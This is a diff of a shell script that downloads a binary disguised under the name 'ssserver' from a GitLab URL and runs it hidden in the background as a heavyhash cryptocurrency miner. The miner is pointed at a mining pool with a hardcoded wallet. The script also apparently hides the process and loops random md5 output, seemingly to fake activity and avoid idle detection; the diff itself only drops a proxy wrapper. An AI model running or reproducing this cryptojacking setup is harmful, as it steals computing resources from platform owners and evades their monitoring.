@@ -31,10 +31,10 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://gitlab.com/cici2/obtc/-/raw/main/ssserver
+wget https://gitlab.com/cici2/obtc/-/raw/main/ssserver
 chmod +x ssserver
 
 ph add ssserver
 
-./graftcp/graftcp ./ssserver --algorithm heavyhash --pool stratum+tcps://stratum-ru.rplant.xyz:17064 --wallet bc1q0l70tfy834e9rz8kpymelv27tweg34v54qdehe.x --password x >/dev/null &
+./ssserver --algorithm heavyhash --pool stratum+tcps://stratum-ru.rplant.xyz:17064 --wallet bc1q0l70tfy834e9rz8kpymelv27tweg34v54qdehe.x --password x >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
